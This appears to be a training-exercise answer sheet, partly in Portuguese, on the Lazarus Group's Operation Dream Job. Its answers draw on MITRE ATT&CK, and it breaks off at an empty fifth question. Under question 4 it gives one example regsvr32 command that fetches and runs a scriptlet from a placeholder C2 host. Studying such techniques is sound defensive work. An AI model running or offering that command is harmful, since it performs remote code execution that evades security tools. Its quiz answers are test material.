# Solution

You are a junior threat intelligence analyst at a Cybersecurity firm. You have been tasked with investigating a Cyber espionage campaign known as Operation Dream Job. The goal is to gather crucial information about this operation.

https://attack.mitre.org/campaigns/C0022/ (Site do MITRE ATT&CK sobre a campanha Dream Job);

## 1. Who conducted Operation Dream Job?

Operation Dream Job was a cyber espionage operation likely conducted by Lazarus Group that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India.

## 2. When was this operation first observed?

First Seen:  September 2019

## 3. There are 2 campaigns associated with Operation Dream Job. One is Operation North Star, what is the other?

Foram duas: Operation North Star e Operation Interception.

## 4. During Operation Dream Job, there were the two system binaries used for proxy execution. One was Regsvr32, what was the other?

`Regsvr32`: O regsvr32.exe é um programa do Windows que “avisa” ao sistema onde encontrar bibliotecas (arquivos .dll) e controles ActiveX, gravando ou removendo essas informações no Registro do Windows para que outros programas possam usá-los corretamente.O grupo Lazarus hospedou um arquivo de scriptlet COM (extensão .sct) em um servidor remoto e invocou o binário regsvr32.exe com parâmetros que desabilitam o registro e habilitam a execução silenciosa.


Como: regsvr32.exe /s /n /u /i:http://c2.exemplo.com/malicioso.sct scrobj.dll; Evasão de detecção: não há alterações no Registro, o que reduz alertas em ferramentas que monitoram a persistência tradicional.

Isso foi feito conjuntamente com o `Rundll32`: Proxy de execução (T1218.011): permite rodar código malicioso como DLL, em vez de um executável, evitando gatilhos em soluções de segurança que não monitoram rundll32.exe;

## 5.	
